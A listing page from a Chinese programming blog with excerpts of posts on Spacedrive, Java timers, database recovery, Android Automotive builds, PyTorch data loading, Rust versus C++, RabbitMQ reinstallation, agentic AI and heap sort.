Spacedrive 的目标用户包括独立创作者，如电影制作人、流媒体、音乐家和设计师，以及那些关心隐私、所有权和设计的人。通过 Spacedrive，用户可以获得一个鸟瞰图，查看他们拥有的所有文件，无论这些文件存储在何处。
Spacedrive的功能与特点 2.1 文件存储在哪里？ Spacedrive 是一个虚拟分布式文件系统（VDFS），它允许用户在多个设备和云服务之间组织和管理文件。文件存储的位置可以是用户的本地设备，如电脑、手机或平板，也可以是云存储服务，如Google Drive、Dropbox、iCloud等。Spacedrive通过其独特的架构，将这些分散的存储位置统一管理，用户可以在一个界面中查看和操作所有文件，而无需关心文件实际存储的具体位置。
2.2 与传统文件管理器的区别 与传统的文件管理器相比，Spacedrive提供了更为先进和灵活的文件管理功能：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08b812a676fb3519935bd06ac5d0e002/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efd4d32bec9cef4e042c7007c3cd3003/" rel="bookmark">
			【JavaEE精炼宝库】多线程（7）定时器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、定时器的概念
二、标准库中的定时器
三、自己实现一个定时器
3.1 MyTimerTask 实现：
3.2 MyTimer 实现：
一、定时器的概念 定时器也是软件开发中的⼀个重要组件。类似于一个 "闹钟"。达到一个设定的时间之后，就执行某个指定好的代码（可以用来完成线程池里面的非核心线程的超时回收）。
定时器是一种实际开发中非常常用的组件。 比如网络通信中，如果对方 500ms 内没有返回数据，则断开连接尝试重连。比如⼀个 Map，希望里面的某个 key 在 3s 之后过期(自动删除)。类似于这样的场景就需要用到定时器。
二、标准库中的定时器 标准库中提供了⼀个 Timer 类。Timer 类的核心方法为 schedule。
schedule 包含两个参数。第⼀个参数指定即将要执行的任务代码，第二个参数指定多长时间之后 执行（单位为毫秒）。如下：
其中第一个参数 TimerTask 是一个抽象类，本质上还是实现了 Runnable 接口，所以我们就可以把它当作 Runnable 来使用即可。 • 使用演示：
public class Main { public static void main(String[] args) { Timer timer = new Timer(); timer.schedule(new TimerTask() { @Override public void run() { System.out.println("hello 3000"); } },3000); timer.schedule(new TimerTask() { @Override public void run() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/efd4d32bec9cef4e042c7007c3cd3003/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5306a388060f29d6b8a436b4bba126fe/" rel="bookmark">
			数据库系统概论——数据库恢复技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 数据库恢复技术事务的基本概念什么是事务如何定义事务：事务的特性 数据库恢复概述故障的种类恢复的实现技术恢复策略事务故障的恢复系统故障的恢复介质故障的恢复 数据库恢复技术 事务的基本概念 什么是事务 事务使用户定义的一个数据库操作序列，这些操作要么全做，要么一个都不做，是一个不可分割的工作单位。事务和程序是两个概念 在关系数据库中，一个事务可以是一条SQL语句，一组SQL语句或整个程序。一个程序通常包含多个事务。 事务时数据库恢复和并发控制的基本单位。 如何定义事务： --显示定义方式 begin transaction sql 语句1 sql 语句2 …… commit --隐式定义 begin transaction sql 语句1 sql 语句2 …… rollback 事务的特性 事务具有四个特性：原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）、持续性（Durability ），我们经常称之为ACID特性。
原子性
事务是数据库的逻辑工作单位，事务中包括的诸操作要么都做，要么都不做。
一致性
事务执行的结果必须是使数据库从一个一致状态变到另一个一致状态。
隔离性
对并发执行而言，一个事务的执行不能被其他事务干扰。
一个事务内部的操作及使用的数据对其他并发事务是隔离的。
并发执行的各个事务之间不能互相干扰。
持续性
也称永久性
一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。
接下来的其他操作或故障不应该对其执行结果有任何影响。
数据库恢复概述 故障是不可避免的：
计算机硬件故障系统软件和应用软件的错误操作员的失误恶意的破坏 故障的影响：
造成运行事务非正常中断，影响数据库中数据的正确性。破坏数据库，使数据库中全部或部分数据丢失。 数据库管理系统对故障的对策
DBMS提供恢复子系统。保证故障发生后，能把数据库中的数据从错误状态+ 恢复到某一已知的正确状态。保证事务ACID。 恢复技术是衡量系统优劣的重要指标。
故障的种类 (1) 事务内部的故障
某个事务在运行过程中由于种种原因未运行至正常终止点就夭折了。
(2) 系统故障
造成系统停止运转的任何事件，使得系统要重新启动。
(3) 介质故障
介质故障又称为硬故障，这类故障使存储在外存中的数据部分丢失或全部丢失。
各类故障，对于数据库的影响有两种可能性：
一是数据库本身被破坏二是数据库没有被破坏，但是数据可能不准确。 恢复的实现技术 恢复操作的基本原理：冗余
利用存储在系统其它的房的冗余数据来重建数据库中已经被破坏或不正确的那部分数据。 恢复机制涉及的关键问题
如何建立冗余数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5306a388060f29d6b8a436b4bba126fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6de5652266f3b063276e10617480a84b/" rel="bookmark">
			【Android】构建 Android Automotive OS：适合初学者的指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人不走空
🌈个人主页：人不走空 💖系列专栏：算法专题 ⏰诗词歌赋：斯是陋室，惟吾德馨 目录
🌈个人主页：人不走空 💖系列专栏：算法专题
⏰诗词歌赋：斯是陋室，惟吾德馨
介绍
先决条件
所需工具和软件
分步指南
1. 设置环境
安装 Java 开发工具包 （JDK）
安装所需的软件包
安装 Git
安装存储库工具
2. 下载Android源码
3. 配置构建
4. 构建 Android Automotive 操作系统
5. 将内部版本刷写到设备或仿真器
刷新到设备
在模拟器上运行
结论
资源
作者其他作品：
介绍 Android Automotive OS 是专为车载使用量身定制的 Android 版本。它通过将各种汽车功能与 Android 应用程序集成，为驾驶员和乘客提供无缝体验。本指南将引导您完成从头开始构建 Android Automotive OS 的过程，涵盖所需的所有必要工具、设置和步骤。
先决条件 在开始之前，请确保您具备以下条件：
装有 Linux 或 macOS 的计算机：构建 Android Automotive OS 与基于 Linux 的系统或 macOS 最兼容。足够的系统资源：至少 16GB RAM 和 400GB 可用磁盘空间。Internet 连接：下载必要的工具和依赖项。 所需工具和软件 Java 开发工具包 （JDK）：Java 8 或更高版本。存储库工具：用于管理 Android 源代码。Git：版本控制系统。AOSP（Android 开源项目）源代码：Android 的基本源代码。Android Studio：最新稳定版本。 分步指南 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6de5652266f3b063276e10617480a84b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d420afa176660d2e63da56f79d7b8f6d/" rel="bookmark">
			基于PyTorch学AI——Dataset与DataLoader
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概况 训练模型离不开数据，PyTorch通过Dataset和DataLoader两个类，提供了灵活且高效的数据读取机制，实现了数据集代码与模型训练代码的解耦。
Dataset数据集负责处理单样本及其相应的标签，既可以使用内置于Pytorch的数据集，也可以使用自己的数据集。
DataLoader在数据集周围包装了一个可迭代项，进一步为模型训练提供了相应的功能。
Dataset Dataset类似一个字典，负责处理索引(index)到样本(sample)的映射。
Dataset可以对样本数据进行预处理，并利用getitem方法返回一个样本。
Dataset有两种类型：map-style datasets和iterable-style datasets。
其中，map-style datasets是实现__getitem__（）和__len__（）协议的数据集，表示idx/key到数据样本的map。该类型数据集使用dataset[idx]访问，返回索引为idx的sample及其标签。
iterable-style datasets是实现__iter_（）协议的IterableDataset的子类的实例，可在数据样本上迭代。这种类型的数据集用于不适合随机读取的情况，以及批量大小取决于提取的数据的情况。这种数据集通过iter(dataset)读取。
简单看下Dataset类的源码，由于是抽象类，官方实现的很简单，只定义了两个方法。
Dataset是抽象类，使用者根据自己的需求实现一个子类，需要实现以下3个方法：
init()：初始化方法。getitem()：基于index获取数据集的一个sample，包括data和label。len()：返回数据集的长度。 举一个Dataset的极简例子：
from torch.utils.data import Dataset class MyDataset(Dataset): def __init__(self, data, labels): self.x = data self.y = labels def __len__(self): return len(self.x) def __getitem__(self, index): return self.x[index], self.y[index] DataLoader DataLoader提供了数据的批量加载、多线程/进程加载、数据打乱等常用功能。
DataLoader类的实现细节较多，后面单独一节详细了解。
举一个DataLoader的极简例子：
from torch.utils.data import DataLoader # 创建dataset dataset = MyDataset(data, targets) # 创建Dataloader dataloader = DataLoader(dataset, batch_size=8, shuffle=True, num_workers=2) # 使用Dataloader加载数据 for batch_x, batch_y in dataloader: # 在这里进行模型的训练或验证操作 pass 加载一个Dataset 官方文档中举了一个从TorchVision加载Fashion MNIST数据集的示例。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d420afa176660d2e63da56f79d7b8f6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95314eeaa78e2c7695f7b7f9f5a32f84/" rel="bookmark">
			性能巅峰对决：Rust vs C&#43;&#43; —— 速度、安全与权衡的艺术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🔥关注墨瑾轩，带你探索Java的奥秘！🚀
🔥超萌技术攻略，轻松晋级编程高手！🚀
🔥技术宝库已备好，就等你来挖掘！🚀
🔥订阅墨瑾轩，智趣学习不孤单！🚀
🔥即刻启航，编程之旅更有趣！🚀
在高性能计算的世界里，Rust与C++无疑是两位顶尖选手，它们各自拥有独特的魅力和强大的性能表现。本文将带你深入探讨这两门语言的性能对决，剖析它们的适用场景与背后的技术权衡，通过实例代码和详尽注解，为你揭示选择它们的智慧之道。
引言：性能竞技场的双雄
Rust，被誉为“没有安全问题的C++”，以零代价抽象、内存安全保证和所有权系统著称，是系统编程的新星。而C++，作为历经数十年考验的经典，凭借其灵活性、性能以及丰富的库支持，至今仍稳坐高性能计算的宝座。
正文：性能对决的深层次探讨
1. 内存管理：所有权 vs 智能指针
Rust 采用所有权系统，通过编译时检查来确保内存安全，避免了运行时的垃圾回收开销。
Rust // Rust 示例：所有权和借用 struct Person { name: String, } fn main() { let person = Person { name: "Alice".to_string() }; display(&amp;person); // 借用，不会转移所有权 } fn display(person: &amp;Person) { println!("Name: {}", person.name); } 注释：此例展示了Rust中通过引用传递结构体，避免了值的复制，体现了所有权系统的优势。
C++ 则依赖智能指针（如std::shared_ptr、std::unique_ptr）来管理内存，平衡了手动管理的灵活性和安全性。
Cpp // C++ 示例：智能指针 #include &lt;iostream&gt; #include &lt;memory&gt; class Person { public: Person(const std::string&amp; name) : name_(name) {} const std::string&amp; GetName() const { return name_; } private: std::string name_; }; void Display(const Person* person) { std::cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95314eeaa78e2c7695f7b7f9f5a32f84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/447d5f1a6128e6f9ca1fe47f6ff03a23/" rel="bookmark">
			Linux环境如何彻底卸载感干净RabbitMQ并重新安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux（Centos7）环境如何彻底卸载感干净RabbitMQ并重新安装 我这个是超级简单的，如果安装不好，顺着网线来找我
一、卸载RabbitMq相关的软件包 1. 先停止RabbitMq服务 systemctl stop rabbitmq-server 2. 查看rabbitmq安装的相关列表 yum list | grep rabbitmq 3. 卸载rabbitmq已安装的相关软件 # 根据自己查到进行卸载 yum -y remove rabbitmq-server.noarch 4. 查看erlang安装的相关软件包 yum list | grep erlang 5. 卸载掉erlang（和卸载掉rabbitmq相同） yum -y remove erlang-* yum remove erlang.x86_64 二、安装Rabbitmq 1.准备工作 1) Rabbitmq安装包 rabbitmq-server-3.8.5-1.el7.noarch 2) erlang语言安装包（erlang-21.3.8.14-1.el7.x86_64） 3) Rabbitmq的配置文件 rabbitmq.conf 这两个的对于版本地址 https://www.rabbitmq.com/which-erlang.html 注意：百度网盘可获得上面的安装包
链接：https://pan.baidu.com/s/1K_0-HVYJwmZhjfD8goOX0w?pwd=wxzs 提取码：wxzs 2. 开始安装 1. 在Linux服务器上/opt下创建一个目录software，并在software下创建一个rabbitmq文件夹 cd /opt mkdir -p software/rabbitmq 2. 上传rabbitmq-server-3.8.5-1.el7.noarch、erlang-21.3.8.14-1.el7.x86_64、rabbitmq.conf到目录rabbitmq下 3. 先安装erlang语言 rpm -ivh erlang-21.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/447d5f1a6128e6f9ca1fe47f6ff03a23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/089eae739c176592c938ad9a234b1cc7/" rel="bookmark">
			吴恩达：从 Agent 到 Agentic，超越基础模型的下一代 AI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Agentic AI：超越基础模型的下一代 AI — 来自吴恩达的洞察 “与其争论哪些工作才算是真正的 Agent，不如承认系统可以具有不同程度的 Agentic 特性。” —— 吴恩达
2024年 Snowflake 峰会开发者日上，人工智能领域的领军人物吴恩达 (Andrew Ng) 发表了题为“AI 代理工作流及其推动 AI 进展的潜力 (How AlAgentic workflows could drive more Al progress than even the next generation of foundation models)”的演讲，为我们揭开了 Agentic AI 的神秘面纱，并指出这可能是比下一代基础模型更具潜力的 AI 发展方向。
Agentic AI ：从 Agent 到 Agentic，开启 AI 新纪元 近年来，大型语言模型 (LLM) 如 GPT-3、GPT-4 等的出现，为人工智能领域带来了前所未有的突破。然而，传统的 LLM 交互方式更像是一种“非代理型工作流程 (Non-agentic workflow (zero-shot))”，用户输入指令，模型输出结果，缺乏迭代优化的空间，犹如一位才华横溢的作家，却被迫只能按照固定模板写作，无法自由挥洒其创作才能。
Agentic AI 的出现打破了这一僵局，它不再将 AI 系统视为被动接收指令的 Agent，而是赋予其主动思考、规划和执行任务的能力，使其更像是一个能够自主决策的智能体。而实现这一目标的关键，就是“代理型工作流程 (Agentic workflow) ”。
吴恩达指出， Agentic workflow 的核心在于将复杂任务分解成多个步骤，并通过循环迭代的方式逐步优化结果。这种工作方式更接近于人类解决问题的思维模式：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/089eae739c176592c938ad9a234b1cc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c0aee77b09f1a787cf392ea505e8f2d/" rel="bookmark">
			【数据结构】第十八弹---C语言实现堆排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✨个人主页： 熬夜学编程的小林
💗系列专栏： 【C语言详解】 【数据结构详解】【C++详解】
目录
1、堆排序
1.1、基本思想
1.2、初步代码实现
1.3、代码优化
1.4、代码测试
总结
1、堆排序 在博主数据结构第十二弹---堆的应用有详细讲解堆排序喔~~~
数据结构第十二弹---堆的应用https://blog.csdn.net/2201_75584283/article/details/135348207https://blog.csdn.net/2201_75584283/article/details/135348207
1.1、基本思想 堆排序(Heapsort)是指利用堆积树（堆）这种数据结构所设计的一种排序算法，它是选择排序的一种。它是通过堆来进行选择数据。需要注意的是排升序要建大堆，排降序建小堆。
为什么升序用到的是大堆呢？
因为：大堆的堆顶是最大的数，可以将其放在数组尾，然后再通过向下调整算法找到次大的数。而小堆的堆顶是最小的数，需要放在第一个位置，如果用原来的堆找不到次小的数，而重新建堆则会更加繁琐。
降序用小堆同理。
动图如下：
1.2、初步代码实现 堆排序的实现可以分为两部分：构建最大堆（或最小堆）和执行排序过程。
注意：此处我们实现的是大堆！！！
第一步：建堆
我们此处是对数组内部的数进行排序，那么怎样才能创建成大堆呢？
这里我们可以使用向上调整算法，从第二个数开始遍历数组，如果不满足大堆则交换父子元素。
for (int i = 1; i &lt; n; i++) { AjustUp(a, i); } 大堆向上调整：
将被调整的数值与其父节点比较，若是大于父节点，则与父节点交换。若子节点下标为child，父节点下标为(child - 1) / 2。当子节点小于父节点时，或者当子节点已经为堆顶时，停止比较。 代码实现：
void AdjustUp(int* a, int child) { int parent = 0; while (child &gt; 0) { parent = (child - 1) / 2; if (a[child] &gt; a[parent]) { Swap(&amp;a[child], &amp;a[parent]); child = parent; } else { break; } } } 小堆向上调整：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c0aee77b09f1a787cf392ea505e8f2d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/245/">«</a>
	<span class="pagination__item pagination__item--current">246/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/247/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>